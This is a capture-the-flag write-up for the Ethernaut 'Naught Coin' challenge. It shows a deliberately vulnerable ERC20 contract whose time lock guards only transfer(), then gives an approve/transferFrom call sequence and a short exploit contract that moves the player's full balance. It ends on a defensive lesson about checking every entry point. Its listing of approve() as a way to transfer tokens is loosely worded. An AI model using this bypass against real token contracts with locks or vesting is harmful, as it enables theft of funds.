# Ethernaut Challenge #15: Naught Coin

**Objective:** Drain all tokens from your balance.

**Contract Analysis:**
```solidity
contract NaughtCoin is ERC20 {
  string public constant name = 'NaughtCoin';
  string public constant symbol = '0x0';
  uint public constant decimals = 18;
  uint public timeLock = now + 10 * 365 days;
  address public player;

  constructor(address _player) ERC20(1000000 * (10**uint256(decimals))) public {
    player = _player;
    transfer(_player, 1000000 * (10**uint256(decimals)));
  }
  
  function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
    return super.transfer(_to, _value);
  }
  
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
    }
    _;
  }
}
```

**The Lock:**

`lockTokens` modifier only checks `transfer()` function:
- If sender is player → must wait 10 years

**The Vulnerability:**

The lock is only on `transfer()`. But ERC20 has OTHER transfer methods!

**Standard ERC20 has:**
- `transfer()` — locked ✗
- `transferFrom()` — NOT CHECKED! ✓
- `approve()` — NOT CHECKED! ✓

**The Attack:**

```javascript
// Step 1: Approve another address (or contract) to spend your tokens
await contract.approve(attackerAddress, hugeAmount);

// Step 2: Use transferFrom (bypasses the lock!)
await contract.transferFrom(playerAddress, recipient, hugeAmount);
```

**Or via contract:**
```solidity
contract NaughtExploit {
  function exploit(address _token, address _player) public {
    IERC20 token = IERC20(_token);
    
    // Step 1: Player approves this contract
    // Step 2: Contract transfers from player
    token.transferFrom(_player, address(this), token.balanceOf(_player));
  }
}
```

**The Lesson:**

Locks on specific functions don't protect the whole contract. Check ALL entry points.

ERC20 has multiple ways to move tokens:
- direct `transfer()`
- `transferFrom()` (with approval)
- `approve()` + `transferFrom()` pattern

**Status:** Challenge understood. Incomplete access control.
